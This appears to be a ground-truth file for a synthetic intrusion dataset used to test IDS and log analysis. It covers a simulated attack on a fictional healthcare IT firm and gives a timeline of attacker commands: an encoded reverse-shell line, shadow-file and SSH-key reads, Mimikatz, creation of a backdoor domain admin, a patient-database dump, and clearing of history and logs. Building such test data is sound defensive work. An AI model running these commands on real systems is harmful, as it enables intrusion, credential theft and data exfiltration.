# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:11:56 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:18:19 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CRBPo1EIaV87iBamvd) |
| 2024-03-18 12:24:18 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:30:22 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:30:23 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:30:57 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (378 requests) |
| 2024-03-18 12:45:19 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:47:45 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:52:38 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: C0o06LG15HQLzWxbHVV) |
| 2024-03-18 12:59:57 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CyfmmGw0aWKU0SyLISJ) |
| 2024-03-18 12:59:59 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CrnrXN45nwMTsqSmkD) |
| 2024-03-18 13:20:28 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CjT0VDQ6Eh9EyiFpjI) |
| 2024-03-18 13:20:28 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581487) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:20:30 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CKGVr8GGSALPUbNlrN) |
| 2024-03-18 13:20:31 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:56 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584328) - `ip addr show` |
| 2024-03-18 13:40:01 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584352) - `cat /etc/hosts` |
| 2024-03-18 13:40:11 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584493) - `cat /etc/resolv.conf` |
| 2024-03-18 13:41:09 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 584707) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:42:45 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 584878) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:44:04 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 585206) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:50:09 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:56:29 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 14:00:22 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587180) - `cat /var/www/html/config.php` |
| 2024-03-18 14:00:27 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587298) - `ls -la /root/.ssh` |
| 2024-03-18 14:01:36 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 588067) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:14:53 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: CgeWZfP2yCkgdFaZ20) |
| 2024-03-18 14:14:54 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: C7rdJJhTCrOnCKyaMI) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:34:40 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962110) - `cat /etc/passwd` |
| 2024-03-18 14:34:46 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962133) - `cat /etc/shadow` |
| 2024-03-18 14:50:23 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:59:23 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 15:00:01 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 15:00:03 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: CQx1TipjN7Au36XARBH) |
| 2024-03-18 15:07:32 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:13:52 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: CrAv9cioHO2COPRP6jD) |
| 2024-03-18 15:20:07 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x2700e4d) |
| 2024-03-18 15:20:09 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6952) - `whoami /all` |
| 2024-03-18 15:20:22 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6960) - `net user /domain` |
| 2024-03-18 15:20:24 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6980) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:20:25 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6984) - `net view /domain` |
| 2024-03-18 15:20:33 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: CX002u9GB4pthlOmxf) |
| 2024-03-18 15:20:33 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:45:18 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 7008) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:45:20 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:45:21 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 16:00:15 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x5554ba5) |
| 2024-03-18 16:00:16 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 16:00:17 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5576) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 16:00:18 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5584) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:07:27 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:15:07 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5600) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:15:09 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:15:10 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5628) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:15:11 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:20:24 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5636) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:20:24 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:20:27 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5652) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:20:29 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:29:43 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:31:28 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:44:38 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 293 queries, 1502 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=289 emitted=6 filtered=283] |
| 2024-03-18 16:49:46 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 16:59:53 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=180 emitted=18 filtered=162] |
| 2024-03-18 17:01:07 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf88591b) |
| 2024-03-18 17:01:08 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5648) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:01:09 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5652) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:14:41 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: CCH5ANa3I5MXMinx5m) |
| 2024-03-18 17:14:42 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158494) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:17:14 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 158846) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:19:19 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 159209) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:19:31 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:24:38 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:443 (UID: CfPd2QdS9cq1lYfazU) |
| 2024-03-18 17:29:32 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:34:47 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:39:46 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608760) - `shred -u /root/.bash_history` |
| 2024-03-18 17:40:52 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982844) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:42:03 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5856) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:42:14 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 5876) - `wevtutil cl Security` |
| 2024-03-18 17:42:15 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:45:18 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:20 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:22 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:50:21 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5884) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:50:24 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:54:33 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:56:20 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:56:55 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 00ace1eb-5d0b-4510-a484-60ae34b9d0f9 | ids | delayed: 1 |
| 0735a2d5-39fa-48ca-9b73-87cc3aa477de | ids | delayed: 1 |
| 08ae5d18-a084-498a-af95-12321601630e | ids | delayed: 1 |
| 1178f2f5-d748-4270-ae5f-0c26b2c218c7 | ids | delayed: 1 |
| 117ff698-945e-4282-b886-19e37e8c43b7 | ids | delayed: 1 |
| 138be0e3-91d4-46bf-a8ec-7ac49bf26418 | ids | delayed: 1 |
| 14d7e24a-80c4-483d-b920-a34881b39a37 | ids | delayed: 1 |
| 1afd0302-db98-4aeb-ae87-72387d56bf21 | ids | delayed: 1 |
| 1bf2bcc2-6e83-4fd3-a421-e2dcaa52163e | ids | delayed: 2 |
| 1ee8a8ef-900d-47a1-890e-5f21fdc6744d | ids | delayed: 1 |
| 1f99512f-b5d5-4705-8fc2-369c97cc01b8 | ids | delayed: 1 |
| 1ffd8b9b-72a7-49b6-87f6-b534a86cdc77 | ids | delayed: 1 |
| 2ef79e19-7ae1-4d39-a482-8e02a77eec96 | ids | delayed: 1 |
| 2f542fc6-7c4d-4d0c-99cf-478e124886c6 | ids | delayed: 1 |
| 2f7de8c7-72ae-49ce-be49-df8937c17869 | ids | delayed: 1 |
| 33d74364-cec4-4d96-8bc4-6ad198d0c025 | ids | delayed: 1 |
| 3414be4b-82f0-4907-829d-f455ce867458 | ids | delayed: 1 |
| 344f8fa3-b4e3-46ce-985c-19c3f9b1ee10 | ids | delayed: 1 |
| 35a1dcc4-c78e-4905-a047-9f9d006dd8b9 | ids | delayed: 1 |
| 35fb2ebf-c832-4c61-9600-0c49517857fc | ids | delayed: 1 |
| 39479127-2090-46f6-812b-b22d58fb72b7 | ids | delayed: 1 |
| 3dd5bc74-7428-491c-9c16-e6883eee4b28 | ids | delayed: 1 |
| 3e4987e9-f9bb-43a7-8d09-6eba8cb0abe7 | ids | delayed: 1 |
| 3fd11576-ea32-4a82-94e3-f0c630b49ef7 | ids | delayed: 2 |
| 40208b6b-a0d7-46c4-bbbb-52e9fe77566b | ids | delayed: 1 |
| 41d37660-b33c-4915-8bf7-9c47a3faa10b | ids | delayed: 2 |
| 446d7e6a-fe73-4042-a703-413470f3312e | ids | delayed: 1 |
| 468115c7-422f-49eb-a7b5-1b1c690c96a3 | ids | delayed: 1 |
| 48b388d5-2397-4ead-b271-ba157d425049 | ids | delayed: 1 |
| 4ca566ce-309e-4af5-96ee-3d42e6109029 | ids | delayed: 2 |
| 4d2e51d1-28bb-46b7-b23b-1183506878e4 | ids | delayed: 1 |
| 514a6e56-735a-43b9-86eb-d3797e13f8c4 | ids | delayed: 1 |
| 5151624c-a470-4d7a-9366-ff7b4463a7e9 | ids | delayed: 1 |
| 5323a577-7086-4786-be96-f5e039300b1c | ids | delayed: 1 |
| 5489e56c-4834-43f1-bcd7-05ae2399c5b9 | ids | delayed: 1 |
| 5a18a1ac-b1d2-42c6-b645-f0534f6accda | ids | delayed: 2 |
| 5d832996-f9b8-4ee5-b27d-67ed6152c34a | ids | delayed: 1 |
| 60def0c9-3b25-47ea-bd88-b8e4d8ee5103 | ids | delayed: 1 |
| 627e7a34-402a-4246-a804-99c9bbb84cd0 | ids | delayed: 1 |
| 66e24b02-4cff-4fd5-8490-f8ad0b74591b | ids | delayed: 1 |
| 6c375311-ddfe-4a4b-91a5-3e7fb21dd541 | ids | delayed: 1 |
| 6e106f03-297e-4a02-9148-53a92d83adb6 | ids | delayed: 1 |
| 6f07a38b-6290-479a-b12b-9ceaf8dce0ca | ids | delayed: 2 |
| 75fa2bfb-dbf8-451f-b134-fb7a5f909b30 | ids | delayed: 1 |
| 76babb5a-f9f1-4627-bcf1-3c8d9d165db8 | ids | delayed: 1 |
| 7727fcee-1285-4331-9319-32bd7e1a17f0 | ids | delayed: 1 |
| 7a453b76-9cdb-431d-85b9-a18e3ea17c39 | ids | delayed: 1 |
| 7b448f53-eadf-475f-a7be-2f8236dd8693 | ids | delayed: 2 |
| 7f68ef98-c148-48f5-9b16-ee8369d289df | ids | delayed: 1 |
| 81d331da-c1ec-49e0-9e9f-15dd13601310 | ids | delayed: 1 |
| 82e9619d-ac14-4512-9a37-d965d44c0b67 | ids | delayed: 1 |
| 8313388b-3972-45ae-af1f-501e89f18977 | ids | delayed: 1 |
| 83ee7d23-8394-414b-bb01-936ae483fc46 | ids | delayed: 1 |
| 83f0e0e6-8101-4241-a168-5c0ae9705f38 | ids | delayed: 1 |
| 84b13a86-b08c-48da-93ea-6662e47e7cef | ids | delayed: 1 |
| 90a01af5-a3c0-4fd2-812a-5f1f53dacfaa | ids | delayed: 2 |
| 9333b7dc-f7b8-4445-903a-af50126eaf8a | ids | delayed: 1 |
| 96888f62-44a7-4d4a-ad02-d1d22a704626 | ids | delayed: 1 |
| 97cfc942-b31c-4e8d-8769-9b70a7c921bf | ids | delayed: 1 |
| 97ff2421-02cf-4c24-9dd2-69858161179f | ids | delayed: 1 |
| 98598217-0284-4e8b-b7ee-68fad08ad435 | ids | delayed: 1 |
| 98b8c98f-706a-43ef-9b8f-60f1cb101f43 | ids | delayed: 1 |
| 98f6cb6a-24a6-484d-9947-84b67108c0a6 | ids | delayed: 1 |
| 9ecf9028-e652-44ef-b534-56fb28012f58 | ids | delayed: 1 |
| 9f9346c5-8688-4926-a1c0-a3ff26006922 | ids | delayed: 1 |
| a1489b86-7db7-4903-92ea-c3d67243d33e | ids | delayed: 1 |
| a15c7003-e659-4bc4-95c1-fd8c634dd78d | ids | delayed: 1 |
| a533c236-6c70-4821-b813-5ae81eeff1d5 | ids | delayed: 1 |
| ae0fa7d6-da83-41c5-8340-3d834265d3f2 | ids | delayed: 2 |
| af19208c-e6e4-4509-898a-e31dbe97344d | ids | delayed: 1 |
| afc8c6cb-8cec-4c02-bda0-4f338c7d6dda | ids | delayed: 1 |
| b26c646a-53db-483e-a769-32958a5a33c3 | ids | delayed: 1 |
| b52ab73d-c215-4278-9748-4184819ec3fd | ids | delayed: 1 |
| b5a7570a-dac1-4a5d-a9d4-1efa01573f27 | ids | delayed: 2 |
| b5b76fed-3c61-49fc-8b06-1314fc1befd1 | ids | delayed: 1 |
| b5d15ed3-d958-40b0-8bfd-21d126dbda72 | ids | delayed: 1 |
| bd5c46ab-1a10-454c-a529-d085d1696f88 | ids | delayed: 1 |
| be943b65-d64b-4bc4-9b8a-12142c321ab6 | ids | delayed: 1 |
| c1f32402-85ad-4dbb-a51e-e301f5084c82 | ids | delayed: 2 |
| c289f619-85bc-4f6a-8ea2-e264793bee03 | ids | delayed: 1 |
| c30fb4e9-75dc-4a3c-a7cd-b60074ed481a | ids | visible: 1 |
| c3329072-bc38-4f87-9d99-9e176a6ab68f | ids | delayed: 1 |
| c69f5e1f-01a9-4e54-aa3e-73201234363a | ids | delayed: 1 |
| cb5f0f29-7d7d-470d-8266-b714b592d4d1 | ids | delayed: 1 |
| cbee847c-7458-49c2-a389-e3c228894686 | ids | visible: 1 |
| cd25a5f2-8115-441c-9bf8-8b43c8f4e02e | ids | delayed: 2 |
| d14cc77b-7930-4c8d-9c0b-813761cf9457 | ids | delayed: 1 |
| d1eb60d2-7ec0-423c-956a-e49d0e0ab5a5 | ids | delayed: 1 |
| d3257681-790f-47c7-ad74-660e40d66e8d | ids | delayed: 1 |
| d3422f1a-6c0f-438b-aa7a-ce33f0dbc9e1 | ids | delayed: 2 |
| d362b26c-6058-469d-9502-7cea4205d238 | ids | delayed: 1 |
| d3af0e08-9252-43f1-9704-b1ec3017f76f | ids | delayed: 1 |
| d954c102-a054-4a78-93dc-7c0f857a7d43 | ids | delayed: 1 |
| dc8efc33-73ba-4b8a-bd20-183024fcaec7 | ids | delayed: 1 |
| df68a9fc-fbc4-475a-bdf7-88e1970f7e64 | ids | delayed: 1 |
| dfb9a7b9-4534-4ea8-bcd9-15dec2bdedb1 | ids | delayed: 1 |
| e148a71a-eb31-4c7a-a1f9-18a046e5da4d | ids | delayed: 1 |
| e35e0f4e-3a92-4455-86bd-77fb53f5bf03 | ids | delayed: 1 |
| e3b5f974-b63d-4080-97a4-a6dc77522743 | ids | delayed: 1 |
| e3da7980-7c07-4bbc-ae18-566cdb0b6693 | ids | delayed: 1 |
| e4d5289a-dae7-4fb5-b17f-c44af5bf2dc5 | ids | delayed: 1 |
| eac73592-3d9a-4d82-8abb-496f46f96c78 | ids | delayed: 1 |
| eb51332d-aa84-4f9f-80a8-47ac484715d8 | ids | delayed: 1 |
| evt-001 | asa | delayed: 6 |
| evt-001 | ecar | delayed: 2 |
| evt-001 | ids | filtered: 1 |
| evt-001 | web | delayed: 1 |
| evt-001 | zeek | delayed: 7, filtered: 4 |
| evt-002 | asa | delayed: 372, dropped: 1, filtered: 1, visible: 4 |
| evt-002 | ecar | delayed: 373, dropped: 5 |
| evt-002 | ids | delayed: 14 |
| evt-002 | web | delayed: 336 |
